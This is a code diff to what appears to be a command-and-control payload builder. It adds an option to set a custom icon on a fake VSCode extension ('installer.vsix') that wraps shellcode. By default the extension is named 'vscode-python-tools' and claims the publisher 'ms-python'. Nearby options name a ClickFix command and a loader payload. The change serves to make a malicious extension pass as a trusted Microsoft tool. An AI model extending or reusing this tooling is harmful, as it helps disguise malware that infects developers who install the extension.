@@ -1447,6 +1447,19 @@ appdomain (self)""",
         ),
 
         BuildParameter(
+            name="0.9y VSCode Custom Icon",
+            group_name="11 - Triggers",
+            parameter_type=BuildParameterType.File,
+            description="Optional PNG icon shown for the extension in the VSCode Extensions panel. VSCode expects 128x128 PNG; other formats may not render. Leave empty for no icon.",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
+            ]
+        ),
+
+        BuildParameter(
             name="0.9c ClickFix Command",
             group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
@@ -6059,6 +6072,19 @@ generated if none have been entered.""",
                             _vscode_fake_name = self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools"
                             _vscode_publisher = self.get_parameter("0.9x VSCode Publisher") or "ms-python"
                             _vscode_sc_path = pathlib.Path(mythic_shellcode_path)
+
+                            _vscode_icon_path = None
+                            _vscode_icon_uuid = self.get_parameter("0.9y VSCode Custom Icon")
+                            if _vscode_icon_uuid:
+                                _icon_resp = await SendMythicRPCFileGetContent(
+                                    MythicRPCFileGetContentMessage(AgentFileId=_vscode_icon_uuid)
+                                )
+                                if _icon_resp.Success and _icon_resp.Content:
+                                    _vscode_icon_path = pathlib.Path(payload_dir) / "vscode_icon.png"
+                                    _vscode_icon_path.write_bytes(_icon_resp.Content)
+                                else:
+                                    output += "[!] VSCode custom icon was uploaded but could not be retrieved - falling back to no icon.\n"
+
                             trigger_path = await asyncio.get_running_loop().run_in_executor(
                                 None, lambda: create_vscode_ext_trigger(
                                     shellcode_path=_vscode_sc_path,
@@ -6068,6 +6094,7 @@ generated if none have been entered.""",
                                     publisher=_vscode_publisher,
                                     output_filename="installer.vsix",
                                     prebuilt_dll_path=_vsix_prebuilt,
+                                    custom_icon_path=_vscode_icon_path,
                                 )
                             )
 
